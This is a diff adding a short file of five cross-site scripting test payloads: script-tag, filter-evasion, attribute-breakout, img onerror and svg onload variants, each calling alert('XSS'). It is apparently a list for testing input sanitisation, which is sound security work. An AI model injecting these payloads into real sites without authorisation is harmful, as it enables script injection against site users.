@@ -1,0 +1,5 @@
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS');>
+<svg/onload=alert('XSS')>
